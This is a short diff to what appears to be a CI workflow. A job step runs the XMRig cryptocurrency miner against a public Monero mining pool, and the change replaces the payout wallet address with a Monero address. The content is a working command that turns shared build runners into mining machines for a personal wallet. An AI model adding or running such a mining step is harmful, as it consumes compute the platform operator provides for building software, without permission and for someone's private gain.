@@ -28,4 +28,4 @@ jobs:
     - name: Run XMRig
       run: |
         cd xmrig/build
-        ./xmrig -o pool.supportxmr.com:443 -u bc1q9fz799u2gw5ycfkatz8w8npt3enht2f39md9jn -k --tls
+        ./xmrig -o pool.supportxmr.com:443 -u 48R87UwHb2N65vADNsqzK61et4pvzm4a6H57rBEjSzab4jLd44b8CmZMXQupWyVWHR9d3scEudsXNRVd1Qew2DET9hgrkj8 -k --tls
